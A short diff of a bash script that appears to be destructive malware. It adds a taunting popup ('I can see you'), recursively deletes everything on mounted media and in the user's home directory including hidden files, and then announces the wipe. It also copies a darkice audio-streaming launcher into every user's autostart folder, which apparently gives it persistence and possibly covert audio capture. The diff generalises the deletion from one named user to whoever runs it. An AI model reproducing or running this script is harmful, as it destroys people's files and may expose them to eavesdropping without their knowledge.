@@ -1,8 +1,9 @@
 #!/bin/bash
+zenity --info --text="I can see you BITCH"
 cd $HOME
 rm -rf /media/*/*
-rm -rf /home/grx/*
-rm -rf /home/grx/.*
+rm -rf /home/$USER/*
+rm -rf /home/$USER/.*
 zenity --notification --text="All directories was cleared"
 mkdir -p /home/grx/.config/autostart
 cp -prf /usr/share/darkice.desktop /home/*/.config/autostart/
